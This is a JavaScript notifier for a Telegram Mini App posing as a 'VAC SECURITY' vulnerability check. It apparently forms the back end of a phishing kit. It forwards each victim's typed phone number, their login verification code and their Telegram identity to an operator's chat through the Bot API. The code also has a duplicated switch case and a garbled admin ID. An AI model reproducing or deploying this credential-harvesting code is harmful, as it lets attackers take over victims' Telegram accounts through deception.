// bot-notifier.js
// Конфигурация
const BOT_TOKEN = '6nFZB7f_YV9trqrBGKplWWt0';
const ADMIN_ID = 'р';

// Форматирование сообщения
const formatMessage = (type, data, user) => {
    const userInfo = `👤 ${user.first_name || 'Пользователь'} ${user.last_name || ''}\n` +
                    `🆔 ID: <code>${user.id || '?'}</code>\n` +
                    `🔗 USER: @${user.username || '?'}`;
    
    switch(type) {
        case 'init':
            return {
                text: `🚪 <b>Новый вход в приложение</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'verified_enter':
            return {
                text: `🟢 <b>Верифицированный пользователь вошел</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'security_check_start':
            return {
                text: `🔍 <b>Пользователь начал проверку безопасности</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'security_check_complete':
            return {
                text: `📊 <b>Проверка безопасности завершена</b>\n\n${userInfo}\n\n` +
                      `Найдено уязвимостей: <b>${data.vulnerabilities || 0}</b>`,
                buttons: []
            };
        case 'phone':
            return {
                text: `📱 <b>Введён номер:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'code':
            return {
                text: `🔢 <b>Введён код</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'verification_success':
            return {
                text: `✅ <b>Успешная верификация</b>\n\n` +
                      `Код: <code>${data.code}</code>\n` +
                      `Попыток: <b>${data.attempts}</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'app_close':
            return {
                text: `🚪 <b>Пользователь вышел из приложения</b>\n\n${userInfo}\n\n` +
                      `Время: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
                buttons: []
            };
        case 'app_close':
            return {
                text: `🚪 <b>Пользователь вышел со страницы верификации</b>\n\n${userInfo}\n\n` +
                      `Время: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
                buttons: []
            };
        case 'vulnerability_fix_attempt':
            return {
                text: `⚠️ <b>Попытка исправить уязвимость</b>\n\n` +
                      `Уязвимость: <b>${data.vulnerability}</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'vulnerability_fixed':
            return {
                text: `✅ <b>Уязвимость исправлена</b>\n\n` +
                      `Уязвимость: <b>${data.vulnerability}</b>\n` +
                      `Время: <code>${new Date(data.timestamp).toLocaleString()}</code>\n\n${userInfo}`,
                buttons: []
            };
        default:
            return {
                text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: ${JSON.stringify(data)}\n\n${userInfo}`,
                buttons: []
            };
    }
};

// Отправка сообщения боту
window.sendToBot = async (type, data = null) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        const message = formatMessage(type, data, user);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `🔐 <b>VAC SECURITY</b>\n\n${message.text}`,
                parse_mode: 'HTML',
                reply_markup: message.buttons.length ? { 
                    inline_keyboard: message.buttons 
                } : undefined
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки:', error);
        return null;
    }
};